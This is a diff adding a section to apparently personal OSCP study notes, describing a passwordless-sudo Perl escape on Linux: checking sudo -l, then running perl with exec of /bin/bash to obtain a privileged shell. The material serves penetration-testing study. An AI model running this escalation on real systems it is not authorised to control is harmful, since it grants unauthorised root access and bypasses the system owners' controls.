@@ -846,6 +846,25 @@ whoami
 
 See [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]], [[OSCP/MODULES/18. Linux Privilege Escalation|Module 18 - Linux Privilege Escalation]], and [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]].
 
+## Passwordless Perl interpreter escape
+
+When sudo allows the exact Perl interpreter without a password, use inline code and process replacement. Confirm the rule before running the escape.
+
+~~~bash
+# Show the exact sudo-approved command and run-as identity.
+sudo -n -l
+
+# Replace the privileged Perl process with Bash.
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+
+# Prove the resulting identity.
+id
+
+whoami
+~~~
+
+Perl's exec function replaces the interpreter process, while the identity granted by sudo remains in effect. Use the exact path shown by sudo -l and confirm the result with id. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]] and [[RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]].
+
 ## External Resources
 
 - [HackTricks - Windows and Linux Pentesting Index](https://hacktricks.wiki/en/index.html)
